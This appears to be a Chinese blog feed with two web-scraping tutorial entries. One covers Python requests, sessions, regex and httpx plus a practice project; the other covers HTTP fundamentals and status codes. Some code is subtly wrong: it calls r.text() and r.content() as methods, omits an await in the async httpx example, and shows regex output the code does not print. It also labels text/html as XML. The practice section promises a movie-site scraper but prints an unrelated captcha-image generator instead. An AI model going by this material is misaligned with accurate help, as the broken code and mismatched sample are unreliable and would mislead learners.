发起请求，返回结果是 str 类型</span></span><br><span class="line">print(r.json()) <span class="comment"># 如果结果是 JSON 格式，可将结果转化为字典</span></span><br><span class="line">print(r.text()) <span class="comment"># 返回 Unicode 类型数据，即取文本内容</span></span><br><span class="line">print(r.content()) <span class="comment"># 结果转化为 bytes 类型数据 </span></span><br><span class="line">print(r.cookies) <span class="comment"># 获取 Cookie，通过 for key, value in r.cookies.item() 解析</span></span><br><span class="line"><span class="comment"># 登录网站后，将请求头中的 Cookie 内容复制加到爬虫的请求头中，便可获取登录后的信息结果</span></span><br><span class="line">print(r.__dict__) <span class="comment"># 可查看返回结果的所有属性内容</span></span><br><span class="line">print(<span class="built_in">dir</span>(r)) <span class="comment"># 查看所有属性名</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;favicon.ico&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;test.com&#x27;</span>, files=files) <span class="comment"># post 请求</span></span><br></pre></td></tr></table></figure><ul><li><strong>Session 维持</strong></li></ul><p>设想，某次利用 post 请求登录网站后，想再次获取登录后的个人信息，使用 get 方法请求，这样是无法获取到的，这相当于开了两个浏览器。</p><p>下面举例 Session 的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">s.get(<span class="string">&#x27;https://www.httpbin.org/cookies/set/number/123456&#x27;</span>)</span><br><span class="line">r = s.get(<span class="string">&#x27;https://www.httpbin.org/cookies&#x27;</span>)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">&#123; <span class="string">&quot;cookies&quot;</span>: &#123;<span class="string">&quot;number&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>可看到 Cookie 获取成功，利用 Session 可以模拟在同一个浏览器中打开同一站点的不同页面。</p><ul><li><strong>其他参数配置</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verify： 设置为 False 可忽略 SSL 证书的验证</span><br><span class="line">timeout：超时设置，可设置为固定值，也可是元组（请求实际可分为连接和读取两个阶段，超时时间可自定）</span><br><span class="line">auth：身份认证，传递元组 (&#39;user&#39;, &#39;password&#39;)</span><br><span class="line">proxies：代理设置，如果代理需要使用身份认证，可使用类似 http:&#x2F;&#x2F;user:password@host:port 语法设置</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>用一定语法规则将特定文本提取出来的方式就是正则表达式匹配，常用匹配规则见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">正则表达式规则</a>。</p><ul><li><strong>match</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;Hello 123 4567 World_This is a Regex Demo&#x27;</span></span><br><span class="line">print(<span class="built_in">len</span>(content))</span><br><span class="line">result = re.match(<span class="string">&#x27;Hello\s\d\d\d\s(\d&#123;4&#125;)\s\w&#123;10&#125;&#x27;</span>, content)</span><br><span class="line">print(result) <span class="comment"># \s 匹配空白字符，\d 匹配数字，\w 匹配单字字符（字母、数字或者下划线）</span></span><br><span class="line">print(result.group())</span><br><span class="line">print(result.group(<span class="number">1</span>))</span><br><span class="line">print(result.span())</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line"><span class="number">41</span></span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">25</span>), match=<span class="string">&#x27;Hello 123 4567 World_This&#x27;</span>&gt;</span><br><span class="line">Hello <span class="number">123</span> <span class="number">4567</span> World_This</span><br><span class="line"><span class="number">4567</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">25</span>)</span><br></pre></td></tr></table></figure><p>从字符串开头开始匹配，第一个参数传入正则表达式，第二个参数传入要匹配的字符串。用 () 将想提取的字符串括起来，匹配结果调用 group 方法，传入分组索引即可获取提取结果。另外<code>.*</code>是通用匹配，代码中的表达式也可以变为 <code>^Hello.*Demo$</code>，<code>^ $</code> 表示开始和结束标识。</p><p><strong>贪婪与非贪婪</strong></p><p>来看一种情况，想要获取目标字符串中的数字，用 <code>.*</code> 简化成下面的表达式，运行如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;Hello 123 4567 World_This is a Regex Demo&#x27;</span></span><br><span class="line">result = re.match(<span class="string">&#x27;^Hello.*(\d+).*Demo$&#x27;</span>, content)</span><br><span class="line">print(result)</span><br><span class="line">print(result.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line"><span class="number">41</span></span><br><span class="line">&lt;re.Match <span class="built_in">object</span>; span=(<span class="number">0</span>, <span class="number">41</span>), match=<span class="string">&#x27;Hello 123 4567 World_This is a Regex Demo&#x27;</span>&gt;</span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>只得到了数字 7，这是因为前面的 <code>.*</code> 会匹配尽可能多的字符，只给 \d+ 剩下一个可满足条件的数字 7，表现出贪婪性，这里我们需要将其变成非贪婪匹配，写法是 <code>.*?</code>，如此运行结果就正常了。</p><p><strong>修饰符</strong></p><p>在网页匹配过程中会遇到换行符等情况，这时候运行就会报错，因为无法匹配换行符，解决方法是 match 加上第三个参数 re.S，常见的修饰符见下表：</p><table><thead><tr><th align="center">修饰符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">re.I</td><td align="center">使匹配对大小写不敏感</td></tr><tr><td align="center">re.L</td><td align="center">实现本地化识别（locale-aware）匹配</td></tr><tr><td align="center">re.M</td><td align="center">多行匹配，影响 ^ 和 $</td></tr><tr><td align="center">re.S</td><td align="center">使匹配内容包括换行符在内的所有字符</td></tr><tr><td align="center">re.U</td><td align="center">根据 Unicode 字符集解析字符，影响 \w、\W、\b 和 \B</td></tr><tr><td align="center">re.X</td><td align="center">忽略表达式中空白和注释（# 引导），以便将正则表达式写得更易于理解</td></tr></tbody></table><p><strong>转移匹配</strong></p><p>当在目标字符串中遇到用作正则匹配模式的特殊字符时，在此字符前加 \ 转义即可。</p><ul><li><strong>search</strong></li></ul><p>匹配时会扫描整个字符串，返回第一个匹配成功的结果，为了匹配方便，尽量使用、 search()。</p><ul><li><strong>findall</strong></li></ul><p>返回所有匹配成功的结果，结果是列表类型，列表中每个元素则是元组类型。</p><ul><li><strong>sub</strong></li></ul><p>正则替换，<code>re.sub(&#39;\d+&#39;, &#39;str&#39;, content)</code>，解释：在 content 中匹配所有数字，将其替换为 str 字符（可为空）。很多时候爬取下来的数据都需要进行清洗，再进行匹配提取操作，sub 方法是不错的选择。</p><ul><li><strong>compile</strong></li></ul><p>为了复用正则表达式，可以用 compile 方法给表达式做一层封装，方便使用，且 compile 中还可加入修饰符。</p><h3 id="httpx-的使用"><a href="#httpx-的使用" class="headerlink" title="httpx 的使用"></a>httpx 的使用</h3><p>urllib 和 requests 有个问题就是只支持 HTTP/1.1，对采用 HTTP/2.0 的网站无法爬取数据，目前支持 HTTP/2.0 有代表性的库有 hyper 和 httpx，后者使用更方便，功能也更强大，用法上和 requests 基本差不多，这里主要说明不一样的地方。</p><ul><li><strong>Client 对象</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> httpx.Client() <span class="keyword">as</span> client:</span><br><span class="line">    response = client.get(<span class="string">&#x27;https://www.httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="comment"># 推荐 with as 用法，等价于：</span></span><br><span class="line">client = httpx.Client()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = client.get(<span class="string">&#x27;https://www.httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    client.close()</span><br></pre></td></tr></table></figure><p>声明 Client 对象时也可指定 headers 等参数，如果开启 HTTP/2.0（默认关闭），写法为：</p><p><code>client = httpx.Client(http2=True)</code></p><blockquote><p>注意：启用 HTTP/2.0 前必须保证客户端和服务器都支持 HTTP/2.0，不然就得改用 1.1 版本</p></blockquote><ul><li>支持异步请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">fetch</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(http2=<span class="literal">True</span>) <span class="keyword">as</span> client:</span><br><span class="line">        response = client.get(<span class="string">&#x27;https://www.httpbin.org/get&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(fetch(<span class="string">&#x27;https://www.httpbin.org/get&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>本节爬取一个基本的静态网站来练手。</p><p><strong>链接</strong> <a href="https://ssr1.scrape.center/">https://ssr1.scrape.center/</a></p><p><img data-src="https://s2.loli.net/2022/02/15/kbYzSNa8wFvcWsC.png"></p><p><strong>目标</strong></p><ul><li>使用 requests 爬取电影列表，包括每个电影的详情页；</li><li>用正则表达式提取每部电影的名称、封面、类别、上映时间、评分、剧情简介等；</li><li>爬取的内容保存为 JSON 文本文件；</li><li>使用多线程加速爬取</li></ul><p><strong>分析</strong></p><p>进入网页后，打开开发者工具（F12），如下图：</p><p><img data-src="https://s2.loli.net/2022/02/16/1SDINWzmiwVCBEx.png"></p><p>可以看到电影名称就是一个 h2 节点文本，父节点是一个 a 节点，带有 href 属性，表示的是电影详情页的 URL，其他的电影信息都可以通过提取源代码节点中的内容来获得。下面，再来看分页逻辑，将页面拉到底，点击第 2 页，可看到跳转链接为原链接加上 /page/2，继续点击第 3 页、第 4 页，发现逻辑一样，分页思路就清晰了。</p><p><img data-src="https://s2.loli.net/2022/02/16/MAkavb7fxm689wj.png"></p><p>要完成列表页的爬取，我们可以这么实现：</p><ul><li>遍历所有页面，索引为1-10</li><li>从每个页面提取每个电影的详情页 URL</li><li>提取每个详情页的页面元素信息并存储</li></ul><p>具体实现中，我们使用 requests 获取源代码，用 re 库采用正则表达式提取有关信息，并保存为 json 格式的 txt 文本，代码中用到了 logging 库输出信息，可区分内容级别，相比 print 输出定制化程度更高，且线程安全。还用到了 multiprocessing 库实现多进程爬取，全部代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> captcha.image <span class="keyword">import</span> ImageCaptcha</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> setting</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line">count_single = <span class="number">10</span>  <span class="comment"># 单条进程生成数量</span></span><br><span class="line">total_process = <span class="number">10</span>  <span class="comment"># 进程数目</span></span><br><span class="line">path = setting.TRAIN_DATASET_PATH  <span class="comment"># 图片数据存储路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_captcha_text</span>():</span></span><br><span class="line">    captcha_text = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(setting.MAX_CAPTCHA):</span><br><span class="line">        c = random.choice(setting.ALL_CHAR_SET)</span><br><span class="line">        captcha_text.append(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(captcha_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_captcha_text_and_image</span>():</span></span><br><span class="line">    image = ImageCaptcha()</span><br><span class="line">    captcha_text = generate_captcha_text()</span><br><span class="line">    captcha_image = Image.<span class="built_in">open</span>(image.generate(captcha_text))</span><br><span class="line">    <span class="keyword">return</span> captcha_text, captcha_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_dataset</span>(<span class="params">_</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_single):</span><br><span class="line">        now = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">        text, image = generate_captcha_text_and_image()</span><br><span class="line">        filename = text + <span class="string">&#x27;_&#x27;</span> + now + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">        image.save(path + os.path.sep + filename)</span><br><span class="line">        print(<span class="string">&#x27;saved %d : %s &#x27;</span> % (i + <span class="number">1</span>, filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pool = multiprocessing.Pool()</span><br><span class="line">    processes = <span class="built_in">range</span>(total_process + <span class="number">1</span>)</span><br><span class="line">    pool.<span class="built_in">map</span>(generate_dataset, processes)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure><p>考虑到数据较多，这里还使用了多进程，生成的数据集如下：</p><p><img data-src="https://s2.loli.net/2022/03/02/NhWSFV5BXrAwpoy.png"></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/2z4tLguB3OP8nN6.png&quot; style=&quot;zoom:67%;&quot; /&gt;

&lt;p&gt;本章我们了解基础的 HTTP 库，如 urllib、requests、httpx等，最后一起来完成对一个静态网站的爬取案例实战。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记一 -- 爬虫基础</title>
    <link href="https://speedpromise.github.io/archives/fc84b201.html"/>
    <id>https://speedpromise.github.io/archives/fc84b201.html</id>
    <published>2022-02-14T08:26:50.000Z</published>
    <updated>2022-02-16T14:32:55.614Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png" style="zoom: 67%;" /><p>本章我们会详细了解 HTTP 原理、爬虫的基本原理、Cookie的基本原理、多进程和多线程的基本原理等，有助于我们更好理解和编写网络爬虫程序。</p><span id="more"></span><h3 id="HTTP基本原理"><a href="#HTTP基本原理" class="headerlink" title="HTTP基本原理"></a>HTTP基本原理</h3><ol><li><strong>URI 和 URL</strong></li></ol><p>URI (Uniform Resource Identifier)，即统一资源标识符；URL (Uniform Resource Locator)，即统一资源定位符。用来寻找互联网上某个资源的链接就是 URI/URL，且具有唯一性。URL 是 URI 的子集，URI 还包括一个子类，叫做URN(Universal Resource Name)，即统一资源名称，只为资源命名而不指定定位，使用很少。对于一般网页链接，都称为 URI 或 URL（习惯）。</p><p>URL遵循一定格式规范，中括号部分为非必要部分，如下：</p><p><code>scheme://[username:password@]hostname[:port][/path][;parameters][?query][#fragment]</code></p><ul><li><code>scheme</code>:：协议。常用的有 http、https、ftp等，也称作 protocol</li><li><code>username</code>、password：用户名和密码。某些情况下 URL 需要提供用户名和密码才能访问</li><li><code>hostname</code>：主机地址。可以是域名或 IP 地址，如 <code>https://www.baidu.com</code>，<code>https://8.8.8.8</code></li><li><code>port</code>：端口。服务器设定的服务端口，如<code>https://8.8.8.8:1234</code>，有些 URL 没有端口信息，是使用默认端口，http 协议默认端口是 80，https 则是 443</li><li><code>path</code>：路径。指网络资源在服务器中的指定地址，如<code>https://github.com/favicon.ico</code>中的 favicon.ico</li><li><code>parameters</code>：参数。用来访问某个资源时的附加信息，如<code>https://8.8.8.8:1234/hello;user</code>，这和 query 不同，勿混用，parameters 是分号后内容</li><li><code>query</code>：查询。如果有多个查询，用 &amp; 隔开，如<code>https://www.example.com/s?wd=nba%ie=utf-8</code></li><li><code>fragment</code>：片段。是对资源描述的部分补充，可理解为资源内容的书签</li></ul><ol start="2"><li><strong>HTTP 和 HTTPS</strong></li></ol><p>在爬虫中，我们抓取的页面通常是基于 HTTP(Hypertext Transfer Protocol) 和 HTTPS(Hypertext Transfer Protocol over Secure Socket Layer) 协议的。</p><p>HTTPS 是在 HTTP 下加入 SSL 层，通过该协议传输的内容都是经过 SSL 加密的，SSL 主要作用如下：</p><ul><li>建立一个信息安全通道，保证数据传输的安全性</li><li>确认网站的真实性。凡是使用 HTTPS 协议的网站，可通过单机浏览器地址栏锁头标志来查看网站认证之后的真实信息，也可通过 CA 机构颁发的安全签章来查询</li></ul><ol start="3"><li><strong>HTTP 请求过程</strong></li></ol><p>在浏览器地址栏输入一个 URL，按下回车后便会向网站所在服务器发送一个请求，网站服务器接收到请求后对其进行处理和解析，然后返回对应响应并传回浏览器，响应中包含页面源代码等内容，浏览器对其进行解析呈现所需网页。</p><ol start="4"><li><strong>请求</strong></li></ol><p>Request，由浏览器发往服务器，分为四部分：请求方法（Request Method）、请求网址（Request URL）、请求头（Request Headers）、请求体（Request Body）。</p><ul><li>请求方法</li></ul><table><thead><tr><th align="center">方法</th><th align="center">描  述</th></tr></thead><tbody><tr><td align="center">GET *</td><td align="center">请求页面，返回页面内容</td></tr><tr><td align="center">HEAD</td><td align="center">类似于 GET 请求，但响应无内容，用于获取报头</td></tr><tr><td align="center">POST *</td><td align="center">大多用于提交表单或上传文件，数据包含在请求体中</td></tr><tr><td align="center">PUT</td><td align="center">用客户端传向服务器的数据替换指定文档中的内容（更新）</td></tr><tr><td align="center">DELETE</td><td align="center">请求服务器删除指定页面</td></tr><tr><td align="center">CONNECT</td><td align="center">把服务器当做跳板，让服务器代替客户端访问其他网页</td></tr><tr><td align="center">OPTIONS</td><td align="center">允许客户端查看服务器的性能</td></tr><tr><td align="center">TRACE</td><td align="center">回显服务器收到的请求，主要用于测试或诊断</td></tr></tbody></table><ul><li><p>请求网址<br>可唯一确定客户端需求资源。</p></li><li><p>请求头</p></li></ul><table><thead><tr><th align="center">请求头</th><th align="center">描  述</th></tr></thead><tbody><tr><td align="center">Accept</td><td align="center">请求报头域，用于指定客户端可接受哪些类型的信息</td></tr><tr><td align="center">Accept-Language</td><td align="center">用于指定客户端可接受的语言类型</td></tr><tr><td align="center">Accept-Encoding</td><td align="center">用于指定客户端可接受的内容编码</td></tr><tr><td align="center">Host</td><td align="center">用于指定请求资源的主机 IP 和端口号，内容为请求 URL 的原始服务器或网关位置</td></tr><tr><td align="center">Cookie</td><td align="center">也常用 Cookies，网站为了辨别用户，进行会话跟踪而存储在用户本地的数据。主要功能是维持当前访问会话</td></tr><tr><td align="center">Referer</td><td align="center">用于标识请求的来源页面，服务器可据此做相应处理，如来源统计、防盗链处理等</td></tr><tr><td align="center">User-Agent</td><td align="center">简称 UA，使服务器识别，客户端使用的操作系统及版本、浏览器及版本信息。爬取时加上使得伪装浏览器程度更高</td></tr><tr><td align="center">Content-Type</td><td align="center">也叫互联网媒体类型（Internet Media Type）或 MIME 类型，表示请求中的媒体类型信息</td></tr></tbody></table><ul><li>请求体<br>一般承载的的是 POST 请求中的表单数据，对于 GET 请求，请求头为空。</li></ul><table><thead><tr><th align="center">Content-Type</th><th align="center">POST 提交数据方式</th></tr></thead><tbody><tr><td align="center">application/x-www-form-urlencoded</td><td align="center">表单数据</td></tr><tr><td align="center">multipart/form-data</td><td align="center">表单文件上传</td></tr><tr><td align="center">application/json</td><td align="center">序列化 JSON 数据</td></tr><tr><td align="center">text/html</td><td align="center">XML 数据</td></tr></tbody></table><ol start="5"><li><strong>响应</strong></li></ol><p>Response，由服务器返回给客户端，分为三部分：响应状态码（Response Status Code）、响应头（Response Headers）和响应体（Response Body）。</p><ul><li>响应状态码&emsp;&emsp;&emsp;&emsp;&emsp; </li></ul><table><thead><tr><th align="center"><span style="display:inline-block;width:60px">状态码</span></th><th align="center">说明</th><th align="center">详  情</th></tr></thead><tbody><tr><td align="center">100</td><td align="center">Continue</td><td align="center">继续。客户端应继续其请求</td></tr><tr><td align="center">101</td><td align="center">Switching Protocols</td><td align="center">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td align="center"><strong>200</strong></td><td align="center">OK</td><td align="center">请求成功。一般用于GET与POST请求</td></tr><tr><td align="center">201</td><td align="center">Created</td><td align="center">已创建。成功请求并创建了新的资源</td></tr><tr><td align="center">202</td><td align="center">Accepted</td><td align="center">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="center">203</td><td align="center">Non-Authoritative Information</td><td align="center">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="center">204</td><td align="center">No Content</td><td align="center">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="center">205</td><td align="center">Reset Content</td><td align="center">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="center">206</td><td align="center">Partial Content</td><td align="center">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td align="center">300</td><td align="center">Multiple Choices</td><td align="center">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td align="center">301</td><td align="center">Moved Permanently</td><td align="center">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="center">302</td><td align="center">Found</td><td align="center">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="center">303</td><td align="center">See Other</td><td align="center">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td align="center">304</td><td align="center">Not Modified</td><td align="center">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td align="center">305</td><td align="center">Use Proxy</td><td align="center">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td align="center">306</td><td align="center">Unused</td><td align="center">已经被废弃的HTTP状态码</td></tr><tr><td align="center">307</td><td align="center">Temporary Redirect</td><td align="center">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td align="center">400</td><td align="center">Bad Request</td><td align="center">客户端请求的语法错误，服务器无法理解</td></tr><tr><td align="center">401</td><td align="center">Unauthorized</td><td align="center">请求要求用户的身份认证</td></tr><tr><td align="center">402</td><td align="center">Payment Required</td><td align="center">保留，将来使用</td></tr><tr><td align="center">403</td><td align="center">Forbidden</td><td align="center">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="center">404</td><td align="center">Not Found</td><td align="center">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td align="center">405</td><td align="center">Method Not Allowed</td><td align="center">客户端请求中的方法被禁止</td></tr><tr><td align="center">406</td><td align="center">Not Acceptable</td><td align="center">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td align="center">407</td><td align="center">Proxy Authentication Required</td><td align="center">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td align="center">408</td><td align="center">Request Time-out</td><td align="center">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td align="center">409</td><td align="center">Conflict</td><td align="center">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td align="center">410</td><td align="center">Gone</td><td align="center">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td align="center">411</td><td align="center">Length Required</td><td align="center">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td align="center">412</td><td align="center">Precondition Failed</td><td align="center">客户端请求信息的先决条件错误</td></tr><tr><td align="center">413</td><td align="center">Request Entity Too Large</td><td align="center">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td align="center">414</td><td align="center">Request-URI Too Large</td><td align="center">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td align="center">415</td><td align="center">Unsupported Media Type</td><td align="center">服务器无法处理请求附带的媒体格式</td></tr><tr><td align="center">416</td><td align="center">Requested range not satisfiable</td><td align="center">客户端请求的范围无效</td></tr><tr><td align="center">417</td><td align="center">Expectation Failed</td><td align="center">服务器无法满足Expect的请求头信息</td></tr><tr><td align="center">500</td><td align="center">Internal Server Error</td><td align="center">服务器内部错误，无法完成请求</td></tr><tr><td align="center">501</td><td align="center">Not Implemented</td><td align="center">服务器不支持请求的功能，无法完成请求</td></tr><tr><td align="center">502</td><td align="center">Bad Gateway</td><td align="center">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td align="center">503</td><td align="center">Service Unavailable</td><td align="center">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td align="center">504</td><td align="center">Gateway Time-out</td><td align="center">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td align="center">505</td><td align="center">HTTP Version not supported</td><td align="center">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><ul><li>响应头</li></ul><table><thead><tr><th align="center">响应头</th><th align="center">描  述</th></tr></thead><tbody><tr><td align="center">Date</td><td align="center">用于标识响应产生的时间</td></tr><tr><td align="center">Last-Modified</td><td align="center">用于指定资源的最后修改时间</td></tr><tr><td align="center">Content-Encoding</td><td align="center">用于指定响应内容的编码</td></tr><tr><td align="center">Server</td><td align="center">包含服务器信息，如名称、版本号等</td></tr><tr><td align="center">Content-Type</td><td align="center">文档类型，指定返回数据类型</td></tr><tr><td align="center">Set-Cookie</td><td align="center">设置 Cookie，用于告诉浏览器需要将此内容放在 Cookie 中，下次请求时将 Cookie 带上</td></tr><tr><td align="center">Expires</td><td align="center">用于指定响应过期时间，可让代理服务器或浏览器将加载的内容更新到缓存中</td></tr></tbody></table><ul><li>响应体<br>响应正文数据都在响应体中，爬虫请求后要解析的就是响应体。在浏览器开发者工具中单机 Preview，可看到网页源代码。</li></ul><ol start="6"><li><strong>HTTP 2.0</strong></li></ol><p>HTTP 协议自 2015 年发布 2.0 版本，特点是更快、更简单、更稳定。HTTP 2.0 